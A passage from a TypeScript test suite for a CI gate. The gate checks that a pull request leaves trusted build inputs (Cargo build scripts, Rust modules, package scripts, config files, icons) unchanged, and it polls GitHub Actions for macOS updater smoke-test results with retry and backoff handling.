    ['[[bin]]\nname = "tool"\n[package]\nname = "epikrise"\n', null],
    ['[[bin]]\nbuild = "tool.rs"\n', null],
  ])("resolves the build script from %j", (manifest, expected) => {
    expect(cargoBuildScriptPath(manifest, "src-tauri/Cargo.toml")).toBe(expected);
  });

  it.each([
    "[package]\nbuild = build_script\n",
    'package = {\n  build = "build.rs"\n}\n',
    'package = { build = ["a", "b"] }\n',
  ])("fails closed on an unparseable build value %j", (manifest) => {
    expect(() => cargoBuildScriptPath(manifest, "src-tauri/Cargo.toml")).toThrow(
      "src-tauri/Cargo.toml",
    );
  });

  it("rejects a build script that a Cargo manifest reads but the pull request adds", async () => {
    const manifest = '[package]\nname = "epikrise"\nbuild = "build/custom.rs"\n';

    await expect(
      assertSmokeWorkflowUnmodified({
        apiBaseUrl: "https://api.github.com",
        owner: "owner",
        repo: "repo",
        baseSha: "base-sha",
        headSha: "head-sha",
        token: "test-token",
        fetchImpl: trustedContentsFetch(
          {
            "src-tauri/Cargo.toml": [cargoManifest(manifest), cargoManifest(manifest)],
            "src-tauri/build/custom.rs": [null, { sha: "new-build-script" }],
          },
          {
            "base-sha": ["src-tauri/Cargo.toml"],
            "head-sha": ["src-tauri/Cargo.toml"],
          },
        ),
      }),
    ).rejects.toThrow("src-tauri/build/custom.rs differs from the PR base");
  });

  it("fails closed when a Cargo tree listing is truncated", async () => {
    const fetchImpl = vi
      .fn<typeof fetch>()
      .mockResolvedValueOnce(response({ sha: "base-sha" }))
      .mockResolvedValueOnce(response({ sha: "head-sha" }))
      .mockResolvedValueOnce(response({ truncated: true, tree: [] }))
      .mockResolvedValueOnce(response({ truncated: false, tree: [] }));

    await expect(
      assertSmokeWorkflowUnmodified({
        apiBaseUrl: "https://api.github.com",
        owner: "owner",
        repo: "repo",
        baseSha: "base-sha",
        headSha: "head-sha",
        token: "test-token",
        fetchImpl,
      }),
    ).rejects.toThrow("GitHub API could not enumerate smoke inputs at base-sha");
  });

  it("rejects a pull request that deletes a trusted build module", async () => {
    const changes = {
      "src-tauri/src/windows_updater_features.rs": [{ sha: "base-features" }, null] as [
        object,
        null,
      ],
    };

    await expect(
      assertSmokeWorkflowUnmodified({
        apiBaseUrl: "https://api.github.com",
        owner: "owner",
        repo: "repo",
        baseSha: "base-sha",
        headSha: "head-sha",
        token: "test-token",
        fetchImpl: trustedContentsFetch(changes),
      }),
    ).rejects.toThrow(
      "src-tauri/src/windows_updater_features.rs differs from the PR base",
    );
  });

  it("rejects a trusted build script modified by the pull request", async () => {
    await expect(
      assertSmokeWorkflowUnmodified({
        apiBaseUrl: "https://api.github.com",
        owner: "owner",
        repo: "repo",
        baseSha: "base-sha",
        headSha: "head-sha",
        token: "test-token",
        fetchImpl: trustedContentsFetch({
          "scripts/prepare-ocr.sh": [{ sha: "base-script" }, { sha: "changed-script" }],
        }),
      }),
    ).rejects.toThrow("scripts/prepare-ocr.sh differs from the PR base");
  });

  it("rejects a frontend file that the pull request adds under a trusted directory", async () => {
    await expect(
      assertSmokeWorkflowUnmodified({
        apiBaseUrl: "https://api.github.com",
        owner: "owner",
        repo: "repo",
        baseSha: "base-sha",
        headSha: "head-sha",
        token: "test-token",
        fetchImpl: trustedContentsFetch(
          { "src/lib/new-helper.ts": [null, { sha: "new-helper" }] },
          { "head-sha": ["src/lib/new-helper.ts"] },
        ),
      }),
    ).rejects.toThrow("src/lib/new-helper.ts differs from the PR base");
  });

  it("rejects a changed Info.plist and a changed static asset", async () => {
    for (const file of ["src-tauri/Info.plist", "static/tauri.svg"]) {
      await expect(
        assertSmokeWorkflowUnmodified({
          apiBaseUrl: "https://api.github.com",
          owner: "owner",
          repo: "repo",
          baseSha: "base-sha",
          headSha: "head-sha",
          token: "test-token",
          fetchImpl: trustedContentsFetch(
            { [file]: [{ sha: "base-asset" }, { sha: "changed-asset" }] },
            { "base-sha": [file], "head-sha": [file] },
          ),
        }),
      ).rejects.toThrow(`${file} differs from the PR base`);
    }
  });

  it("passes only when both required smoke jobs succeed", () => {
    expect(evaluateSmokeRun(successfulRun, successfulJobs).state).toBe("passed");
    expect(
      evaluateSmokeRun(
        { ...successfulRun, status: "in_progress", conclusion: null },
        successfulJobs.slice(0, 1),
      ).state,
    ).toBe("pending");
  });

  it("fails when a required smoke job fails", () => {
    const jobs = [successfulJobs[0], { ...successfulJobs[1], conclusion: "failure" }];

    expect(evaluateSmokeRun(successfulRun, jobs)).toMatchObject({
      state: "failed",
      message: expect.stringContaining("Build aarch64-apple-darwin"),
    });
  });

  it("fails clearly when no matching smoke run appears before the deadline", async () => {
    const fetchImpl = queueTrustedInputs(vi.fn<typeof fetch>()).mockResolvedValueOnce(
      response({ workflow_runs: [] }),
    );

    await expect(
      waitForMacosSmoke({
        apiBaseUrl: "https://api.github.com",
        owner: "owner",
        repo: "repo",
        pullRequestNumber: 42,
        headSha: "release-sha",
        headRef: "release/2026.11.0",
        baseSha: "base-sha",
        token: "test-token",
        fetchImpl,
        now: () => 1_000,
        maxWaitMs: 0,
      }),
    ).rejects.toThrow("no matching smoke workflow run has appeared");
  });

  it("retries transient API errors before continuing to poll", async () => {
    const fetchImpl = queueTrustedInputs(vi.fn<typeof fetch>())
      .mockResolvedValueOnce(new Response("temporary failure", { status: 503 }))
      .mockResolvedValueOnce(response({ workflow_runs: [successfulRun] }))
      .mockResolvedValueOnce(response({ jobs: successfulJobs }));
    let elapsedMs = 0;

    await expect(
      waitForMacosSmoke({
        apiBaseUrl: "https://api.github.com",
        owner: "owner",
        repo: "repo",
        pullRequestNumber: 42,
        headSha: "release-sha",
        headRef: "release/2026.11.0",
        baseSha: "base-sha",
        token: "test-token",
        fetchImpl,
        now: () => elapsedMs,
        sleep: async (duration) => {
          elapsedMs += duration;
        },
        maxWaitMs: 5_000,
      }),
    ).resolves.toBeUndefined();
    expect(fetchImpl).toHaveBeenCalledTimes(trustedRequests + 3);
    expect(elapsedMs).toBe(1_000);
  });

  it("fails promptly for permanent API permission errors", async () => {
    const fetchImpl = queueTrustedInputs(vi.fn<typeof fetch>()).mockResolvedValueOnce(
      new Response('{"message":"Resource not accessible by integration"}', {
        status: 403,
      }),
    );

    await expect(
      waitForMacosSmoke({
        apiBaseUrl: "https://api.github.com",
        owner: "owner",
        repo: "repo",
        pullRequestNumber: 42,
        headSha: "release-sha",
        headRef: "release/2026.11.0",
        baseSha: "base-sha",
        token: "test-token",
        fetchImpl,
        now: () => 0,
        maxWaitMs: 5_000,
      }),
    ).rejects.toThrow("GitHub Actions API request failed (403)");
    expect(fetchImpl).toHaveBeenCalledTimes(trustedRequests + 1);
  });

  it("retries network failures reported by fetch", async () => {
    const fetchImpl = queueTrustedInputs(vi.fn<typeof fetch>())
      .mockRejectedValueOnce(
        new TypeError("fetch failed", { cause: new Error("ECONNRESET") }),
      )
      .mockResolvedValueOnce(response({ workflow_runs: [successfulRun] }))
      .mockResolvedValueOnce(response({ jobs: successfulJobs }));
    let elapsedMs = 0;

    await expect(
      waitForMacosSmoke({
        apiBaseUrl: "https://api.github.com",
        owner: "owner",
        repo: "repo",
        pullRequestNumber: 42,
        headSha: "release-sha",
        headRef: "release/2026.11.0",
        baseSha: "base-sha",
        token: "test-token",
        fetchImpl,
        now: () => elapsedMs,
        sleep: async (duration) => {
          elapsedMs += duration;
        },
        maxWaitMs: 5_000,
      }),
    ).resolves.toBeUndefined();
    expect(fetchImpl).toHaveBeenCalledTimes(trustedRequests + 3);
  });

  it("fails immediately on programming errors thrown as TypeError", async () => {
    const fetchImpl = queueTrustedInputs(vi.fn<typeof fetch>()).mockRejectedValueOnce(
      new TypeError("Cannot read properties of undefined"),
    );

    await expect(
      waitForMacosSmoke({
        apiBaseUrl: "https://api.github.com",
        owner: "owner",
        repo: "repo",
        pullRequestNumber: 42,
        headSha: "release-sha",
        headRef: "release/2026.11.0",
        baseSha: "base-sha",
        token: "test-token",
        fetchImpl,
        now: () => 0,
        maxWaitMs: 5_000,
      }),
    ).rejects.toThrow("Cannot read properties of undefined");
    expect(fetchImpl).toHaveBeenCalledTimes(trustedRequests + 1);
  });

  it("honors Retry-After when GitHub asks the gate to back off", async () => {
    const sleeps: number[] = [];
    const fetchImpl = queueTrustedInputs(vi.fn<typeof fetch>())
      .mockResolvedValueOnce(
        new Response("slow down", {
          status: 429,
          headers: { "Retry-After": "7" },
        }),
      )
      .mockResolvedValueOnce(response({ workflow_runs: [successfulRun] }))
      .mockResolvedValueOnce(response({ jobs: successfulJobs }));

    await waitForMacosSmoke({
      apiBaseUrl: "https://api.github.com",
      owner: "owner",
      repo: "repo",
      pullRequestNumber: 42,
      headSha: "release-sha",
      headRef: "release/2026.11.0",
      baseSha: "base-sha",
      token: "test-token",
      fetchImpl,
      now: () => 0,
      sleep: async (duration) => {
        sleeps.push(duration);
      },
      maxWaitMs: 60_000,
    });
    expect(sleeps).toEqual([7_000]);
  });

  it("retries a rate-limited 403 with the fallback backoff", async () => {
    const sleeps: number[] = [];
    const fetchImpl = queueTrustedInputs(vi.fn<typeof fetch>())
      .mockResolvedValueOnce(
        new Response("API rate limit exceeded", {
          status: 403,
          headers: { "x-ratelimit-remaining": "0" },
        }),
      )
      .mockResolvedValueOnce(response({ workflow_runs: [successfulRun] }))
      .mockResolvedValueOnce(response({ jobs: successfulJobs }));

    await waitForMacosSmoke({
      apiBaseUrl: "https://api.github.com",
      owner: "owner",
      repo: "repo",
      pullRequestNumber: 42,
      headSha: "release-sha",
      headRef: "release/2026.11.0",
      baseSha: "base-sha",
      token: "test-token",
      fetchImpl,
      now: () => 0,
      sleep: async (duration) => {
        sleeps.push(duration);
      },
      maxWaitMs: 60_000,
    });
    expect(sleeps).toEqual([1_000]);
    expect(fetchImpl).toHaveBeenCalledTimes(trustedRequests + 3);
  });

  it("ignores x-ratelimit-reset on a server error and uses the fallback backoff", async () => {
    const sleeps: number[] = [];
    const resetInFortyFiveMinutes = Math.floor(Date.now() / 1000) + 2_700;
    const fetchImpl = queueTrustedInputs(vi.fn<typeof fetch>())
      .mockResolvedValueOnce(
        new Response("bad gateway", {
          status: 502,
          headers: { "x-ratelimit-reset": String(resetInFortyFiveMinutes) },
        }),
      )
      .mockResolvedValueOnce(response({ workflow_runs: [successfulRun] }))
      .mockResolvedValueOnce(response({ jobs: successfulJobs }));

    await waitForMacosSmoke({
      apiBaseUrl: "https://api.github.com",
      owner: "owner",
      repo: "repo",
      pullRequestNumber: 42,
      headSha: "release-sha",
      headRef: "release/2026.11.0",
      baseSha: "base-sha",
      token: "test-token",
      fetchImpl,
      now: () => 0,
      sleep: async (duration) => {
        sleeps.push(duration);
      },
      maxWaitMs: 60_000,
    });
    expect(sleeps).toEqual([1_000]);
  });

  it("retries request timeouts reported as AbortError or TimeoutError", async () => {
    const fetchImpl = queueTrustedInputs(vi.fn<typeof fetch>())
      .mockRejectedValueOnce(
        Object.assign(new Error("The operation was aborted"), {
          name: "AbortError",
        }),
      )
      .mockRejectedValueOnce(
        Object.assign(new Error("The operation timed out"), {
          name: "TimeoutError",
        }),
      )
      .mockResolvedValueOnce(response({ workflow_runs: [successfulRun] }))
      .mockResolvedValueOnce(response({ jobs: successfulJobs }));
    const sleeps: number[] = [];

    await waitForMacosSmoke({
      apiBaseUrl: "https://api.github.com",
      owner: "owner",
      repo: "repo",
      pullRequestNumber: 42,
      headSha: "release-sha",
      headRef: "release/2026.11.0",
      baseSha: "base-sha",
      token: "test-token",
      fetchImpl,
      now: () => 0,
      sleep: async (duration) => {
        sleeps.push(duration);
      },
      maxWaitMs: 60_000,
    });
    expect(sleeps).toEqual([1_000, 2_000]);
    expect(fetchImpl).toHaveBeenCalledTimes(trustedRequests + 4);
  });

  it("times out with the transient cause when retries exhaust the deadline", async () => {
    const fetchImpl = queueTrustedInputs(vi.fn<typeof fetch>()).mockResolvedValueOnce(
      new Response("unavailable", { status: 503 }),
    );

    await expect(
      waitForMacosSmoke({
        apiBaseUrl: "https://api.github.com",
        owner: "owner",
        repo: "repo",
        pullRequestNumber: 42,
        headSha: "release-sha",
        headRef: "release/2026.11.0",
        baseSha: "base-sha",
        token: "test-token",
        fetchImpl,
        now: () => 1_000,
        maxWaitMs: 0,
      }),
    ).rejects.toThrow(
      "Timed out waiting for macOS updater bundle smoke results on release/2026.11.0 at release-sha after a transient GitHub API failure",
    );
  });

  it("names a base mismatch when the smoke run was built for an older base", async () => {
    const fetchImpl = queueTrustedInputs(vi.fn<typeof fetch>()).mockResolvedValueOnce(
      response({
        workflow_runs: [
          {
            ...successfulRun,
            display_title:
              "macOS updater bundle smoke | PR #42 | head release-sha | base old-base",
          },
        ],
      }),
    );

    await expect(
      waitForMacosSmoke({
        apiBaseUrl: "https://api.github.com",
        owner: "owner",
        repo: "repo",
        pullRequestNumber: 42,
        headSha: "release-sha",
        headRef: "release/2026.11.0",
        baseSha: "base-sha",
        token: "test-token",
        fetchImpl,
        now: () => 1_000,
        maxWaitMs: 0,
      }),
    ).rejects.toThrow("created for a different base");
  });

  it("keeps polling a pending run until both jobs pass", async () => {
    const sleeps: number[] = [];
    const pendingJobs = successfulJobs.map((job) => ({
      ...job,
      status: "in_progress",
      conclusion: null,
    }));
    const fetchImpl = queueTrustedInputs(vi.fn<typeof fetch>())
      .mockResolvedValueOnce(
        response({
          workflow_runs: [
            { ...successfulRun, status: "in_progress", conclusion: null },
          ],
        }),
      )
      .mockResolvedValueOnce(response({ jobs: pendingJobs }))
      .mockResolvedValueOnce(response({ workflow_runs: [successfulRun] }))
      .mockResolvedValueOnce(response({ jobs: successfulJobs }));

    await waitForMacosSmoke({
      apiBaseUrl: "https://api.github.com",
      owner: "owner",
      repo: "repo",
      pullRequestNumber: 42,
      headSha: "release-sha",
      headRef: "release/2026.11.0",
      baseSha: "base-sha",
      token: "test-token",
      fetchImpl,
      now: () => 0,
      sleep: async (duration) => {
        sleeps.push(duration);
      },
      maxWaitMs: 60_000,
      intervalMs: 30_000,
    });
    expect(sleeps).toEqual([30_000]);
    expect(fetchImpl).toHaveBeenCalledTimes(trustedRequests + 4);
  });

  it("skips a newer successful run whose required jobs were all skipped", async () => {
    const skippedJobs = successfulJobs.map((job) => ({
      ...job,
      conclusion: "skipped",
    }));
    const fetchImpl = queueTrustedInputs(vi.fn<typeof fetch>())
      .mockResolvedValueOnce(
        response({
          workflow_runs: [{ ...successfulRun, id: 130, run_number: 2 }, successfulRun],
        }),
      )
      .mockResolvedValueOnce(response({ jobs: skippedJobs }))
      .mockResolvedValueOnce(response({ jobs: successfulJobs }));

    await expect(
      waitForMacosSmoke({
        apiBaseUrl: "https://api.github.com",
        owner: "owner",
        repo: "repo",
        pullRequestNumber: 42,
        headSha: "release-sha",
        headRef: "release/2026.11.0",
        baseSha: "base-sha",
        token: "test-token",
        fetchImpl,
        now: () => 0,
        sleep: async () => {
          throw new Error("should not sleep");
        },
        maxWaitMs: 60_000,
        intervalMs: 30_000,
      }),
    ).resolves.toBeUndefined();
    expect(fetchImpl).toHaveBeenCalledTimes(trustedRequests + 3);
  });

  it("does not accept an older success when a newer run failed before creating jobs", async () => {
    const fetchImpl = queueTrustedInputs(vi.fn<typeof fetch>())
      .mockResolvedValueOnce(
        response({
          workflow_runs: [
            {
              ...successfulRun,
              id: 130,
              run_number: 2,
              created_at: "2026-11-02T01:00:00Z",
              conclusion: "startup_failure",
            },
            successfulRun,
          ],
        }),
      )
      .mockResolvedValueOnce(response({ jobs: [] }));

    await expect(
      waitForMacosSmoke({
        apiBaseUrl: "https://api.github.com",
        owner: "owner",
        repo: "repo",
        pullRequestNumber: 42,
        headSha: "release-sha",
        headRef: "release/2026.11.0",
        baseSha: "base-sha",
        token: "test-token",
        fetchImpl,
        now: () => 0,
        sleep: async () => {
          throw new Error("should not sleep");
        },
        maxWaitMs: 60_000,
        intervalMs: 30_000,
      }),
    ).rejects.toThrow("Smoke workflow concluded startup_failure");
    expect(fetchImpl).toHaveBeenCalledTimes(trustedRequests + 2);
  });

  it("reads later pages of workflow runs for the head SHA", async () => {
    const skippedRuns = Array.from({ length: 100 }, (_, index) => ({
      ...successfulRun,
      id: 1000 + index,
      conclusion: "skipped",
      run_number: index + 2,
    }));
    const fetchImpl = queueTrustedInputs(vi.fn<typeof fetch>())
      .mockResolvedValueOnce(response({ workflow_runs: skippedRuns }))
      .mockResolvedValueOnce(response({ workflow_runs: [successfulRun] }))
      .mockResolvedValueOnce(response({ jobs: successfulJobs }));

    await expect(
      waitForMacosSmoke({
        apiBaseUrl: "https://api.github.com",
        owner: "owner",
        repo: "repo",
        pullRequestNumber: 42,
        headSha: "release-sha",
        headRef: "release/2026.11.0",
        baseSha: "base-sha",
        token: "test-token",
        fetchImpl,
        now: () => 0,
        sleep: async () => {
          throw new Error("should not sleep");
        },
        maxWaitMs: 60_000,
        intervalMs: 30_000,
      }),
    ).resolves.toBeUndefined();
    expect(
      fetchImpl.mock.calls.some(([input]) => String(input).includes("page=2")),
    ).toBe(true);
    expect(fetchImpl).toHaveBeenCalledTimes(trustedRequests + 3);
  });

  it("trusts every script and Rust module reachable from the trusted build inputs", () => {
    const repoRoot = new URL("../", import.meta.url);
    const reached = new Set<string>();
    const unsupportedRust: string[] = [];
    const pending = [
      ".github/workflows/macos-updater-bundle-smoke.yml",
      "src-tauri/build.rs",
      "src-tauri/tauri.conf.json",
      "src-tauri/tauri.release.conf.json",
      "vite.config.js",
      "svelte.config.js",
      "package.json",
    ];

    /**
     * Only the package.json scripts the smoke job runs (`pnpm install` runs
     * `prepare`, `pnpm build` runs `build`) are followed; the rest are not
     * executed by this gate.
     */
    function inputText(file: string): string {
      const text = readFileSync(new URL(file, repoRoot), "utf8");
      if (file !== "package.json") return text;
      const { scripts } = JSON.parse(text) as Record<string, Record<string, string>>;
      return [scripts.build, scripts.prepare].join("\n");
    }

    while (pending.length > 0) {
      const current = pending.pop() as string;
      if (reached.has(current)) {
        continue;
      }
      reached.add(current);
      const contents = inputText(current);
      if (current.endsWith(".rs")) {
        if (rustUnsupportedInclude.test(contents) || hasUnpathedModule(contents)) {
          unsupportedRust.push(current);
        }
      }
      for (const [reference] of contents.matchAll(scriptReference)) {
        pending.push(reference);
      }
      for (const match of contents.matchAll(rustPathAttribute)) {
        pending.push(
          path.posix.join(path.posix.dirname(current), match.groups?.modulePath ?? ""),
        );
      }
      for (const [, specifier] of contents.matchAll(relativeImport)) {
        pending.push(path.posix.join(path.posix.dirname(current), specifier));
      }
    }

    expect(reached).toContain("svelte.config.js");
    expect(unsupportedRust).toEqual([]);
    const untrusted = [...reached].filter((file) => !isSmokeTrustedInput(file));
    expect(untrusted).toEqual([]);
  });

  it("trusts the tsconfig and every icon the Tauri bundle reads", () => {
    const repoRoot = new URL("../", import.meta.url);
    const config = JSON.parse(
      readFileSync(new URL("src-tauri/tauri.conf.json", repoRoot), "utf8"),
    ) as { bundle: { icon: string[] } };
    const icons = config.bundle.icon.map((icon) => path.posix.join("src-tauri", icon));

    expect(icons.length).toBeGreaterThan(0);
    expect(isSmokeTrustedInput("tsconfig.json")).toBe(true);
    expect(icons.filter((icon) => !isSmokeTrustedInput(icon))).toEqual([]);
  });

  it("follows every #[path] spelling and flags module forms it cannot resolve", () => {
    const spellings = [
      '#[path = "a.rs"]',
      '#[path="a.rs"]',
      '#[path = r"a.rs"]',
      '#[cfg_attr(unix, path = "a.rs")]',
      '#[cfg_attr(all(unix, not(target_os = "linux")), path = "a.rs")]',
      '#[path = r#"a.rs"#]',
      '#[cfg_attr(all(unix, not(windows)), path = r#"a.rs"#)]',
    ];
    for (const spelling of spellings) {
      const matches = [...spelling.matchAll(rustPathAttribute)].map(
        (match) => match.groups?.modulePath,
      );
      expect(matches).toEqual(["a.rs"]);
    }

    expect(hasUnpathedModule('#[path = "a.rs"]\nmod a;\n')).toBe(false);
    expect(hasUnpathedModule("mod helpers;\n")).toBe(true);
    expect(hasUnpathedModule("pub(crate) mod helpers;\n")).toBe(true);
    expect(hasUnpathedModule("pub(super) mod helpers;\n")).toBe(true);
    expect(hasUnpathedModule("#[cfg(test)] mod tests;\n")).toBe(true);
    expect(hasUnpathedModule('#[path = "a.rs"]\npub(crate) mod a;\n')).toBe(false);
    expect(rustUnsupportedInclude.test('include!("gen.rs");')).toBe(true);
    expect(rustUnsupportedInclude.test('include_str!("data.txt")')).toBe(true);
  });

  it("follows side-effect imports, require calls, and any script extension", () => {
    const source = [
      'import "./setup.mjs";',
      'import { x } from "./a.mjs";',
      'const b = require("./b.cjs");',
      'await import("./c.js");',
      'run("scripts/tool.ps1"); run("scripts/build.sh.");',
    ].join("\n");
    const imports = [...source.matchAll(relativeImport)].map((match) => match[1]);
    expect(imports).toEqual(["./setup.mjs", "./a.mjs", "./b.cjs", "./c.js"]);
    const scripts = [...source.matchAll(scriptReference)].map((match) => match[0]);
    expect(scripts).toEqual(["scripts/tool.ps1", "scripts/build.sh"]);
  });

  it.each([
    ".npmrc",
    ".pnpmfile.cjs",
    ".cargo/config",
    ".cargo/config.toml",
    "src-tauri/.cargo/config.toml",
    "rust-toolchain.toml",
    "src-tauri/rust-toolchain.toml",
    "src-tauri/tauri.macos.conf.json",
    "postcss.config.cjs",
    ".postcssrc.cts",
    ".postcssrc.mts",
    ".env.production",
  ])("rejects a PR that changes the build config file %s", async (configFile) => {
    expect(smokeTrustedPaths).toContain(configFile);
    const changes: Record<string, [object | null, object | null]> = {
      [configFile]: [{ sha: "base-config" }, { sha: "head-config" }],
    };

    await expect(
      assertSmokeWorkflowUnmodified({
        apiBaseUrl: "https://api.github.com",
        owner: "owner",
        repo: "repo",
        baseSha: "base-sha",
        headSha: "head-sha",
        token: "test-token",
        fetchImpl: trustedContentsFetch(changes),
      }),
    ).rejects.toThrow(`${configFile} differs from the PR base`);
  });
});
